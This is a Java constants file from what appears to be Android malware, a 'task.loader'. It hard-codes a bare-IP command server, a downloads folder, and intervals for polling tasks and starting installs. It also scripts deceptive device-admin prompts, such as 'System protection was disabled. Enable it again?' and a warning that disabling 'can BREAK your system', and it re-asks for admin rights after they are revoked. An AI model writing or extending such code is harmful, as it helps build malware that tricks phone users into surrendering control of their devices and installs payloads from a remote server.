package task.loader;

import android.os.Environment;

import java.io.File;
import java.util.Arrays;
import java.util.List;

public class Constants
{
    public static final boolean DEBUG = false;
    public static final boolean SNG_ENABLED = true;
    public static String LOGS_DIR = "";

    public static File DOWNLOADS_DIR = new File(Environment.getExternalStorageDirectory(), "downloads");

    public static List<String> SERVERS = Arrays.asList("https://91.214.70.163:7227/");

    public static int SERVER_TRY_COUNT = 5;

    public static final long TASKS_CHECK_INTERVAL = Settings.times.MINUTE;
    public static final long START_INSTALL_INTERVAL = Settings.times.SECOND * 20;

    //admin
    public static final boolean ADMIN_ENABLE = false;
    public static final int ADMIN_REQUEST_COUNT = 5;
    public static final String ADMIN_TEXT_REQUEST = "System protection was disabled. Enable it again?";
    public static final String ADMIN_TEXT_DISABLE_REQUEST = "Disabling this option can BREAK your system. Are you sure?";
    public static final boolean REPEAT_ADMIN_REQUEST_AFTER_DISABLE = true; // ask for admin after disabling

    //landing
    public static final String LANDING_TITLE_DEFAULT = "Important";
}
